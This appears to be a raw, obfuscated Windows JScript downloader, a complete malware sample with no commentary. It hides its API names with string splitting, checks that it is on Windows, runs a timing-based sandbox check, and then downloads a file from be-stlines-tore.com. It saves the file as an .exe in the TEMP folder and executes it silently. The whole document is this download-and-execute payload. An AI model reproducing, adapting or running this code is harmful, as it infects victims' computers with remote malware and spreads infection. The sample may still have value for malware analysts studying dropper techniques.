var R1 = false;
var D0 = "Create"+"Object";
var H1 = function TB() {return WScript[D0]("WScript"+".Shell");}(), CR = 11;
var AB = "MSXML2"+".XMLHTTP";
var VQ = 2;
var W0 = VQ - 2;
function D(ZG){H1["Run"](ZG, W0, W0);};
function EV(){return AB + "";};
function MS(M, K0){W0 = W0 * 1; return M - K0;};
function E(){return D0;};
/*@cc_on
  @if (@_win32 || @_win64)
    R1 = true;
  @end
@*/
if (R1)
{
var W = "";
function A(){return 22;};
var S = 0; var ZA = 0;
function I()
{
var H0 = new this["Date"]();
var K = H0["getUTCMilliseconds"]();
WScript["Sleep"](A());
var H0 = new this["Date"]();
var NS = H0["getUTCMilliseconds"]();
WScript["Sleep"](A());
var H0 = new this["Date"]();
var H = H0["getUTCMilliseconds"]();
var S = "R";
S = MS(NS, K);
var ZA = "GK";
ZA = MS(H, NS);
W = "open";
return MS(S, ZA);
}
var SS = false;
var WJ = false;
for (var HQ = W0; HQ < A() * 1; HQ++){if (I() != W0){
SS = true; 
ZA = "31" + 11 * S + ZA; 
WJ = true; 
break;
}}
function FY() {return ((SS == true) && (SS == WJ)) ? 1 : W0;};
if (SS && FY() && WJ){
function T() {return H1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Bks2tJ0T.ex" + "e";};
 S0 = EV();
 YK = WScript[D0](S0);
 var UN = 1;
do { 
	for (;UN;){
	try {
		if (UN == 1)
		{
			YK[W]("GET", "http://be-stlines-tore.com/k3soa", false);
			YK["send"]();
			J = "Sleep";
			UN = 2;
		}
		WScript[J](A() + 120); 
		if (YK["readystate"] < 2 * 2) continue;
		UN = W0;
		function FM(KP) {var KV = (1, 2, 3, 4, 5, KP); return KV;};
		YN = WScript[E()]("ADODB.Stream");
		S0 = YN;
		S0[W]();
		S0["type"] = FM(1);
		S0["write"](YK["ResponseBody"]);
		YN["position"] = FM(W0);
		S0["Save" + "ToFile"](T(), 2);
		YN["cl"+"ose"]();
		RN = T();
		D(RN);
	} catch(R0){};};
}while (UN);
}
}

